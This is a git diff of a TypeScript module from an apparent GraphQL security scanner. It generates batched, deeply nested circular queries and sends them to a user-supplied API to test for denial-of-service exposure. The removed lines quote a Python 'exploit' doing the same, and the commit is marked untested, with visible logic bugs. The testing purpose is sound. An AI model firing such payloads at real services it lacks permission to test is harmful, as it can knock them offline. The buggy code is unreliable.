11de4a034539bdba22101f5d4f7cfb961a6d25b4
Megan Kabat <mnkabat@gmail.com>
2023-10-06 18:23:39 -0700

    circular query code finished but have not tested yet

--- server/circularQuery.ts
+++ server/circularQuery.ts
@@ -1,101 +1,242 @@
-import { Request, Response, NextFunction } from 'express';
+/**
+ * ************************************
+*
+* @module  circularQuery.ts
+* @author  MADR Productions - MK & RP
+* @date    10-05-23
+* @description searches for circular references within the object types in the schema, generates and executes circular queries when found, and returns a pass or fail depending on if the number of nested relationships exceeds the maximum allowable depth
+*
+* ************************************
+*/
+import { Request, Response, NextFunction, RequestHandler } from 'express';
 
-const circularQuery = async (req: Request, res: Response, _next: NextFunction) => {
-  const fetchModule = await import('node-fetch');
-  const fetch = fetchModule.default;
-  const query = `
-  query {
-    pastes {
-        owner {
-            pastes {
-                owner {
-                    name
-                    }
-                }
-            }
-        }
-    }`;
-
-  // To experiment with circular queries, we’ve coded a custom exploit for
-  // your arsenal of hacking tools. This exploit can dynamically extend its
-  // circularity by letting you specify the number of circles that should be
-  // performed. The query is also capable of batching queries using arrays.
-  // ARRAY_LENGTH = 5
-  // FIELD_REPEAT = 10
-  // query = {"query":"query {"}
-  // field_1_name = 'pastes'
-  // field_2_name = 'owner'
-  // count = 0
-  // for _ in range(FIELD_REPEAT):
-  // count += 1
-  // closing_braces = '} ' * FIELD_REPEAT * 2 + '}'
-  // payload = "{0} {{ {1} {{ ".format(field_1_name, field_
-  // 2_name)
-  // query["query"] += payload
-  // if count == FIELD_REPEAT:
-  // query["query"] += '__typename' + closing_braces
-  // --snip--
-  // queries = []
-  // for _ in range(ARRAY_LENGTH):
-  // queries.append(query)
-  // r = requests.post('http://localhost:5013/graphql', json=qu
-  // eries)
-  // print(r.json())
-
-  try {
-    console.log('entered scan');
-    const API = req.body.API;
-    console.log('using this API', API);
-    const response = await fetch(API, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/graphql',
-      },
-      body: query,
-    });
-    // type DataType = {
-    //   details: Record<string, any>;
-    // };
-    console.log('response: ', response);
-    //this part is in the works- figuring how to break them up with types/might get rid of ts
-    const obj: any = await response.json();
-    console.log('obj: ', obj.data);
-
-    res.sendStatus(200);
-  } catch (err) {
-    console.log('injectionAttack middleware', err);
-    res.status(400).json('Unable to submit query. An error occurred.');
-  }
+type VulnerabilityType = {
+    generateQueries: RequestHandler
+    attack: RequestHandler
 };
+interface GraphQLType {
+    name: string
+    kind:string
+    fields?: GraphQLField[]
+}
+interface GraphQLField {
+    name: string
+    args?: GraphQLArgs[]
+    type: GraphQLTypeReference
+}
+interface GraphQLArgs {
+    name: string
+    type?: GraphQLTypeReference
+}
+interface GraphQLTypeReference {
+    kind: string
+    name?: string
+    ofType?: GraphQLTypeReference
+    fields?: GraphQLField[]
+}
 
-export default circularQuery;
+// Helper function that searches for circular references within the schema
+export const circularQuery: VulnerabilityType = {
+  generateQueries: async (req: Request, res: Response, next: NextFunction) => {
+    console.log('Generating circular queries...');
+  // Retrieves all the operation types "Query, Mutation, Subscription" in the schema
+  const schemaTypes: GraphQLType[] = res.locals.schema.data.__schema.types;
+  let field_1_name: string = '';
+  let field_2_name: string = '';
+  let scalar_name: string = '';
+
+  const findCircularRelationship = (
+    type: GraphQLType | GraphQLTypeReference,
+    firstObjName: string = '',
+    objTypeName: string = '',
+    allRelationships: string[], // contains all circularly referenced field names
+    ): void => {
+      // Filter out objects that are query, mutation, and subscription types
+      const customNameTypes = schemaTypes.filter((object) => 
+      object.name !== 'Query' && 'Mutations' && 'Subscription' 
+      && object.kind === 'OBJECT');
+
+    // Iterate over the array of customNameType objects
+    for (let i = 0; i < customNameTypes.length; i++) {
+      const fields = customNameTypes[i].fields;
+      if (firstObjName === '') {
+        fields?.forEach((field) => {
+          if (field.type.ofType?.kind === 'OBJECT') {
+            firstObjName = customNameTypes[i].name; // PasteObject
+            objTypeName = field.type.ofType?.name; // OwnerObject
+            // (field.type.name != null) ? objTypeName = field.type.name : objTypeName = field.type.ofType.name;
+            field_1_name = field.name; // owner
+          }
+        })
+      } else if (customNameTypes[i].name === objTypeName) {      
+        const fields2 = customNameTypes[i].fields;
+        fields2?.forEach((field) => {
+          if (field.type.ofType?.kind === 'SCALAR' && scalar_name === '') {
+            scalar_name = field.name;
+          }
+          if (field.type.ofType?.kind === 'OBJECT' && 
+            field.type.ofType?.name === firstObjName) {
+              field_2_name = field.name;
+              return; 
+            }
+        })
+      }
+    };
+
+    // enter for loop
+    // check if firstObjName is = '', if so then enter the if statement
+    // if not check if customNameTypes = objTypeName if so then enter second if 
+    // otherwise continue to loop
+
+    allRelationships.push(field_1_name, field_2_name);
+    // return the field names to the generateQuery function
+  };
+
+
+  const ARRAY_LENGTH = 5;
+    const FIELD_REPEAT = 10;
+    let query = 'query {';
+    const first_field = `${field_1_name}`;
+    const second_field = `${field_2_name}`;
+    let count = 0;
+
+    for (let i = 0; i < FIELD_REPEAT; i++) {
+      count++;
+      const closing_braces = '}'.repeat(FIELD_REPEAT * 2) + '}';
+      const payload = `${first_field} { ${second_field} { `;
+      query += payload;
+
+      if (count === FIELD_REPEAT) {
+        query += scalar_name + closing_braces;
+      }
+    }
+
+    const queries = [];
+
+    for (let i = 0; i < ARRAY_LENGTH; i++) {
+      console.log(query);
+      queries.push(query);
+    }
+    res.locals.queries = queries;
+    return;
+  },
+  attack: async (req: Request, res: Response, _next: NextFunction) => {
+    // console.log('Sending Queries...');
+
+    // Move this to TS file
+    interface QueryResult {
+      id: string;
+      status: string;
+      title: string;
+      description: string;
+      severity: string | number;
+      testDuration: string | number;
+      lastDetected: string | number;
+    }
+
+    const result: QueryResult[] = [];
+    const API: string = req.body.API;
+    let ID: number = 1;
+
+    // Think about logic of the query result and how we define each variable, should we summarize and use accordion? The send req could be modularized.
+    const sendReqAndEvaluate = async (query: string) => {
+      try {
+        const queryResult: QueryResult = {
+          id: `DoS-${ID++}`,
+          status: 'Pass',
+          title: 'Circular Query',
+          description: '',
+          severity: 'P1',
+          testDuration: '',
+          lastDetected: '',
+        };
+
+        const sendTime = Date.now(); // checks for the time to send and receive respsonse from GraphQL API
+
+        const data = await fetch(API, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/graphql',
+          },
+          body: query,
+        }).catch((err) => console.log(err));
+
+        // fetch('http://localhost:5013/graphql', {
+        //   method: 'POST',
+        //   headers: {
+        //     'Content-Type': 'application/json',
+        //   },
+        //   body: JSON.stringify(res.locals.queries),
+        // })
+        //   .then((response) => response.json())
+        //   .then((data) => {
+        //     console.log(data);
+        //     return data;
+        //   })
+        //   .catch((error) => console.error('Error:', error));
+
+        if (!data) return; // is this line necessary?
+
+        const response = await data.json();
+        const timeTaken = Date.now() - sendTime;
+        queryResult.description = query;
+        queryResult.testDuration = `${timeTaken} ms`;
+        queryResult.lastDetected = `${new Date().toLocaleTimeString(
+          'en-GB',
+        )} - ${new Date()
+          .toLocaleDateString('en-GB')
+          .split('/')
+          .reverse()
+          .join('-')}`;
+
+        // Currently, pass/fail is based on error message length, but we could also look at "Did you mean..." to see if the response includes sugggested fields
+        if (response.data) {
+          queryResult.status = 'Fail';
+        }
+        result.push(queryResult);
+        console.log(response); // This is the response from the server but it is not currently used by the client
+      } catch (err) {
+        console.log(err);
+      }
+    };
+    const arrofQueries = res.locals.queries;
+    for (const query of arrofQueries) {
+      await sendReqAndEvaluate(query);
+    }
+    return result;
+  },
+}
+
+//   try {
+//     console.log('entered scan');
+//     const API = req.body.API;
+//     console.log('using this API', API);
+//     const response = await fetch(API, {
+//       method: 'POST',
+//       headers: {
+//         'Content-Type': 'application/graphql',
+//       },
+//       body: query,
+//     });
+//     // type DataType = {
+//     //   details: Record<string, any>;
+//     // };
+//     console.log('response: ', response);
+//     //this part is in the works- figuring how to break them up with types/might get rid of ts
+//     const obj: any = await response.json();
+//     console.log('obj: ', obj.data);
+
+//     res.sendStatus(200);
+//   } catch (err) {
+//     console.log('injectionAttack middleware', err);
+//     res.status(400).json('Unable to submit query. An error occurred.');
+//   }
+// }
+// };
 
 // import { Request, Response, NextFunction, RequestHandler } from 'express';
 
-// type InjectionType = {
-//     generateQuery: RequestHandler
-//     attack: RequestHandler
-// }
-// interface GraphQLType {
-//     name: string
-//     kind:string
-//     fields?: GraphQLField[]
-// }
-// interface GraphQLField {
-//     name: string
-//     args?: GraphQLArgs[]
-//     type: GraphQLTypeReference
-// }
-// interface GraphQLArgs {
-//     name: string
-//     type?: GraphQLTypeReference
-// }
-// interface GraphQLTypeReference {
-//     kind: string
-//     name?: string
-//     ofType?: GraphQLTypeReference
-//     fields?: GraphQLField[]
-// }
+
 
 // export const injection: InjectionType = {
 //     generateQuery: async (req: Request, res: Response, _next: NextFunction) => {
@@ -146,3 +287,66 @@ export default circularQuery;
 
 //     }
 // }
+
+
+
+// fields?.forEach((field) => {
+//   if (field.type.ofType?.kind === 'OBJECT') {
+//     let firstObjName = customNameTypes[i].name; // PasteObject
+//     objTypeName = field.type.ofType?.name; // OwnerObject
+//     field_1_name = field.name; // owner
+     
+//   if (customNameTypes[i].name === objTypeName) {      
+//     const fields2 = customNameTypes[i].fields;
+//     fields2?.forEach((field) => {
+//       if (field.type.ofType?.kind === 'OBJECT' && 
+//       field.type.ofType?.name === firstObjName) {
+//         field_2_name = field.name;
+//         return; 
+//       }
+//     })
+//   }
+// }})
+
+// 
+// for (let i = 0; i < customNameTypes.length; i++) {
+//   if (customNameTypes[i].fields !== null) {
+//     const fields = customNameTypes[i].fields;
+//     for (let i = 0; i < fields.length; i++) {
+//       if (fields[i].type.ofType?.kind === 'OBJECT') {
+//         let firstObjName = customNameTypes[i].name; // PasteObject
+//         objTypeName = fields[i].type.ofType?.name; // OwnerObject
+//         field_1_name = fields[i].name; // owner
+    
+//         if (customNameTypes[i].name === objTypeName) {      
+//           if (fields?[i].type.ofType?.kind === 'OBJECT' && 
+//             fields?[i].type.ofType?.name === firstObjName) {
+//               field_2_name = fields?[i].name;
+//               return; 
+//             }
+//           }
+//       }
+//     }
+//   }
+// }
+
+
+// for (let i = 0; i < customNameTypes.length; i++) {
+  //  fields?.forEach((field) => {
+//   if (field.type.ofType?.kind === 'OBJECT') {
+//     let firstObjName = customNameTypes[i].name; // PasteObject
+//     objTypeName = field.type.ofType?.name; // OwnerObject
+//     field_1_name = field.name; // owner
+     
+//   if (customNameTypes[i].name === objTypeName) {      
+//     const fields2 = customNameTypes[i].fields;
+//     fields2?.forEach((field) => {
+//       if (field.type.ofType?.kind === 'OBJECT' && 
+//       field.type.ofType?.name === firstObjName) {
+//         field_2_name = field.name;
+//         return; 
+//       }
+//     })
+//   }
+// }})
+  // }
